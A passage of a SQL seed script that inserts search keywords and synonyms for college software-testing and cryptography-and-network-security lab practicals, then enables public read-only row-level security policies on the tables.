    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-9$skey$),
    $term$radio$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-9$skey$),
    $term$stqa pr0.html$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-9$skey$),
    $term$stqa practical 9$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-9$skey$),
    $term$Count Checked and Unchecked Checkboxes using Selenium WebDriver$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$jmeter$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$load testing$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$performance testing$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$apache jmeter$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$thread group$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$http request defaults$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$graph results$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$bugzilla$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$STQA Practical 10$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$stqa-practical-10$skey$),
    $term$Load Testing using JMeter$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-1$skey$),
    $term$substitution cipher$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-1$skey$),
    $term$transposition cipher$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-1$skey$),
    $term$transportation cipher$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-1$skey$),
    $term$qwertyuiopasdfghjklzxcvbnm$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-1$skey$),
    $term$3142$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-1$skey$),
    $term$itssg vgksr!$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-1$skey$),
    $term$classical encryption$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-1$skey$),
    $term$CNS Practical 1$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-1$skey$),
    $term$Substitution and Transposition Cipher in Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-2$skey$),
    $term$rsa$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-2$skey$),
    $term$public-key encryption$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-2$skey$),
    $term$pkcs1_oaep$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-2$skey$),
    $term$pycryptodome$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-2$skey$),
    $term$crypto.publickey$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-2$skey$),
    $term$binascii$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-2$skey$),
    $term$asymmetric encryption$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-2$skey$),
    $term$CNS Practical 2$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-2$skey$),
    $term$RSA Encryption and Decryption in Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-3$skey$),
    $term$message authentication code$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-3$skey$),
    $term$mac$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-3$skey$),
    $term$md5$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-3$skey$),
    $term$hashlib$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-3$skey$),
    $term$message integrity$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-3$skey$),
    $term$digest$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-3$skey$),
    $term$hexdigest$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-3$skey$),
    $term$CNS Practical 3$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-3$skey$),
    $term$MD5 Message Authentication Code Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-4$skey$),
    $term$digital signature$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-4$skey$),
    $term$rsa signature$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-4$skey$),
    $term$pkcs1_15$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-4$skey$),
    $term$sha256$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-4$skey$),
    $term$pycryptodome$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-4$skey$),
    $term$signature verification$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-4$skey$),
    $term$authenticity$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-4$skey$),
    $term$CNS Practical 4$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-4$skey$),
    $term$RSA Digital Signature in Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-5$skey$),
    $term$diffie-hellman$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-5$skey$),
    $term$diffie hellman$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-5$skey$),
    $term$diffine hellmen$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-5$skey$),
    $term$key exchange$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-5$skey$),
    $term$alice and bob$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-5$skey$),
    $term$shared secret$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-5$skey$),
    $term$primitive root$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-5$skey$),
    $term$CNS Practical 5$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-5$skey$),
    $term$Diffie-Hellman Key Exchange in Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-6$skey$),
    $term$ipsec$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-6$skey$),
    $term$cisco packet tracer$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-6$skey$),
    $term$network devices$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-6$skey$),
    $term$router configuration$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-6$skey$),
    $term$ping 192.168.2.2$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-6$skey$),
    $term$cns practical 6$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-6$skey$),
    $term$Configure IPSec on Network Devices in Packet Tracer$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$ssl$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$tls$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$ssl/tls$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$web security$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$create_default_context$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$wrap_socket$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$example.com$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$certificate management$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$CNS Practical 7$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-7$skey$),
    $term$Web Security with SSL/TLS in Python$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-8$skey$),
    $term$intrusion detection system$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-8$skey$),
    $term$ids$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-8$skey$),
    $term$opencv$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-8$skey$),
    $term$cv2$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-8$skey$),
    $term$findcontours$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-8$skey$),
    $term$shinchan.webp$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-8$skey$),
    $term$cns practical 8$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-8$skey$),
    $term$Intrusion Detection System Python OpenCV$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-9$skey$),
    $term$malware analysis$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-9$skey$),
    $term$malware detection$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-9$skey$),
    $term$virusshare$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-9$skey$),
    $term$virustotal$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-9$skey$),
    $term$antivirus tools$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-9$skey$),
    $term$cns practical 9$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-9$skey$),
    $term$Malware Analysis using VirusShare and VirusTotal$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$firewall$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$windows defender firewall$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$inbound rules$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$outbound rules$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$rule-based filtering$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$nslookup$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$80, 443$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$httpblock$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$android.com$term$,
    'keyword'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$CNS Practical 10$term$,
    'synonym'
);
INSERT INTO public.practical_search_terms (practical_id, term, term_type)
VALUES (
    (SELECT id FROM public.practicals WHERE source_key = $skey$cryptography-and-network-security-practical-10$skey$),
    $term$Firewall Configuration and Rule-Based Filtering$term$,
    'synonym'
);

-- 4. Ensure Public Read-Only Row Level Security (RLS) Policies Are Active
ALTER TABLE public.subjects ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.practicals ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.practical_search_terms ENABLE ROW LEVEL SECURITY;
GRANT SELECT ON public.subjects TO anon, authenticated;
GRANT SELECT ON public.practicals TO anon, authenticated;
GRANT SELECT ON public.practical_search_terms TO anon, authenticated;
DROP POLICY IF EXISTS "Public read access to subjects" ON public.subjects;
CREATE POLICY "Public read access to subjects" ON public.subjects FOR SELECT TO anon, authenticated USING (true);
DROP POLICY IF EXISTS "Public read access to approved practicals" ON public.practicals;
CREATE POLICY "Public read access to approved practicals" ON public.practicals FOR SELECT TO anon, authenticated USING (is_published = true AND review_required = false AND verification_status IN ('verified', 'corrected'));
DROP POLICY IF EXISTS "Public read access to search terms of approved practicals" ON public.practical_search_terms;
CREATE POLICY "Public read access to search terms of approved practicals" ON public.practical_search_terms FOR SELECT TO anon, authenticated USING (EXISTS (SELECT 1 FROM public.practicals p WHERE p.id = practical_search_terms.practical_id AND p.is_published = true AND p.review_required = false));

COMMIT;